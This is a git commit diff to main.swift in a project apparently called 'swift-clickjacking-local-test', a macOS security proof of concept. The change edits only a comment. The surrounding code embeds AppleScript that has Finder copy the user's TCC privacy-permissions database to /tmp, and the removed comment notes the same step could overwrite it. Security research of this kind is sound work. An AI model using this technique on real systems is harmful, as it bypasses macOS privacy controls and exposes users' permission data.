44474bfa59d1753c79730c230fc6be9004aad9fb
Cedric Owens <41086586+cedowens@users.noreply.github.com>
2022-04-16 19:33:29 -0400

    Update main.swift

--- swift-clickjacking-local-test/swift-clickjacking-local-test/main.swift
+++ swift-clickjacking-local-test/swift-clickjacking-local-test/main.swift
@@ -11,7 +11,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
       let dispatch = DispatchQueue.global(qos: .background)
       let source = """
         tell application "Finder"
-        # copy the TCC database, this could also be used to overwrite it.
+        # copy the TCC database
         set applicationSupportDirectory to POSIX path of (path to application support from user domain)
         set tccDirectory to applicationSupportDirectory & "com.apple.TCC/TCC.db"
         duplicate file (POSIX file tccDirectory as alias) to folder (POSIX file "/tmp/" as alias) with replacing
